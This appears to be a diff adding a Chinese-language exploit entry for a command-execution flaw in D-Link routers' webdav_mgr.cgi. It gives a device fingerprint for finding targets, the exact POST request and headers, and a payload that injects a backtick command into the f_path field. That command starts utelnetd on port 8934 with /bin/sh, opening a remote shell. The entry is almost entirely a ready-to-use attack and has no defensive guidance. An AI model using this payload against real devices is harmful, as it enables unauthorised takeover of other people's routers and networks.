@@ -1,0 +1,12 @@
+# D-Linkwebdav_mgr.cgi存在命令执行漏洞
+
+- **系统**：D-Linkwebdav_mgr.cgi　|　**类型**：命令执行　|　**CVE**：—
+- **指纹**：`"D-Link-DIR"`
+- **请求**：`POST /cgi-bin/webdav\_mgr.cgi HTTP/1.1`
+- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`X-Requested-With: XMLHttpRequest`　`Content-Length: 95`　`Cookie: username=admin`　`Priority: u=0`
+
+**请求体 / payload**
+```
+cmd=Webdav\_Account\_add\&f\_path='`utelnetd -p 8934 -l /bin/sh`'\&f\_share\_name=\&f\_rw=\&f\_user=\&webdav=
+```
+- **预期**：200　|　—
